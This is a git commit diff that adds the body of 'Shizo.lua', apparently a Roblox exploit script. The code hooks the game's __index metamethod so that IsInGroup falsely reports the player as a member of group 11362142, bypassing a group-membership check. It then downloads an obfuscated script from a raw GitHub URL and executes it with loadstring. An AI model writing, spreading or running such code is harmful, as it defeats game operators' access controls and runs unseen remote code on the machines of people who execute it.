8306a2f96a0a889e1d4f0ba425802e20e7f83cb9
IHaxU <30863082+IHaxU@users.noreply.github.com>
2022-04-30 07:18:26 +0200

    Update Shizo.lua

--- Shizo.lua
+++ Shizo.lua
@@ -1,1 +1,16 @@
---Shits apparently wrong, will fix later.
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local oldIdx
+oldIdx = hookmetamethod(game, "__index", function(self, method, ...)
+    local ret = oldIdx(self, method, ...)
+    if method == "IsInGroup" then
+        return newcclosure(function(self, groupId, ...)
+            if self == LocalPlayer and groupId == 11362142 then
+                return true
+            end
+            return ret(self, groupId, ...)
+        end)
+    end
+    return ret
+end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yt-flix/sohot/main/obfuscated20%25'))()
